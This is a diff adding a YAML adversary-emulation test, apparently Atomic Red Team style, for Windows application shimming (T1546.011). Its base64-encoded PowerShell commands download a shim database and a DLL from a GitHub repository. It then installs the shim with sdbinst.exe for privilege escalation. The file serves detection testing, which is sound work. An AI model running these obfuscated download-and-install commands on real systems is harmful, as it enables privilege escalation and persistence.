@@ -1,0 +1,24 @@
+- id: e30409ce-e1d6-5266-a143-0688abbcc4e6
+  name: Soumaia ART Tests - Application Shim Installation
+  description: "Install a shim database. This technique is used for privilege escalation and bypassing user access control.\nUpon execution, \"Installation of AtomicShim complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll. To better understand what is happening, review\nthe source code files is the <PathToAtomicsFolder>\\\\T1546.011\\\\src directory. (requires elevation)"
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.011
+    name: 'Event Triggered Execution: Application Shimming'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAEEAdABvAG0AaQBjAFMAaABpAG0AeAA4ADYALgBzAGQAYgAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAE4AZQB3AC0ASQB0AGUAbQAgAC0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAAKABzAHAAbABpAHQALQBwAGEAdABoACAAIgAuAFwAQQB0AG8AbQBpAGMAUwBoAGkAbQB4ADgANgAuAHMAZABiACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEANQA0ADYALgAwADEAMQAvAGIAaQBuAC8AQQB0AG8AbQBpAGMAUwBoAGkAbQB4ADgANgAuAHMAZABiACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABBAHQAbwBtAGkAYwBTAGgAaQBtAHgAOAA2AC4AcwBkAGIAIgAKAA==
+          )
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAGMAOgBcAFQAbwBvAGwAcwBcAEEAdABvAG0AaQBjAFQAZQBzAHQALgBkAGwAbAApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIABjADoAXABUAG8AbwBsAHMAXABBAHQAbwBtAGkAYwBUAGUAcwB0AC4AZABsAGwAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEANQA0ADYALgAwADEAMQAvAGIAaQBuAC8AQQB0AG8AbQBpAGMAVABlAHMAdAAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIABjADoAXABUAG8AbwBsAHMAXABBAHQAbwBtAGkAYwBUAGUAcwB0AC4AZABsAGwACgA=
+          )
+          sdbinst.exe ".\AtomicShimx86.sdb"
+        cleanup: |-
+          sdbinst.exe -u ".\AtomicShimx86.sdb" >nul 2>&1
+        payloads:
+        - AtomicShimx86.sdb
